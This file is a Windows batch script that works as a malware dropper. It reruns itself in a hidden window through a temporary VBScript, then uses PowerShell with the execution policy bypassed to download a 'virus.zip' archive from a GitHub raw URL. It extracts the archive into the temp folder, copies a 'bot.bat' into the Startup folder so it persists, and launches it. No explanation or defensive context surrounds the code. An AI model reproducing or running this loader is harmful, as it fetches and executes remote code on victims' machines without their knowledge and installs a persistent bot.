@echo off
if not defined HIDDEN (
    set HIDDEN=1
    echo Set o=CreateObject("WScript.Shell") > "%temp%\hid.vbs"
    echo o.Run "cmd /c ""%~f0"" %*", 0, False >> "%temp%\hid.vbs"
    cscript //nologo "%temp%\hid.vbs"
    del "%temp%\hid.vbs"
    exit /b
)
setlocal enabledelayedexpansion

set "tempdir=%TEMP%"
set "zipurl=https://raw.githubusercontent.com/banzoxOG/zip/main/virus.zip"
set "zipfile=%tempdir%\virus.zip"

:: Download the zip from raw GitHub
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%zipurl%' -OutFile '%zipfile%';"

:: Extract all files directly into %TEMP%, overwrite if exist
powershell -NoProfile -ExecutionPolicy Bypass -Command "Expand-Archive -Path '%zipfile%' -DestinationPath '%tempdir%' -Force;"

:: Delete the zip file (optional, uncomment if you want it gone)
:: del /f /q "%zipfile%"

:: Copy bot.bat to shell:startup and run it
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
if exist "%tempdir%\bot.bat" (
    copy /y "%tempdir%\bot.bat" "%startup%\bot.bat"
    start "" "%tempdir%\bot.bat"
)

exit
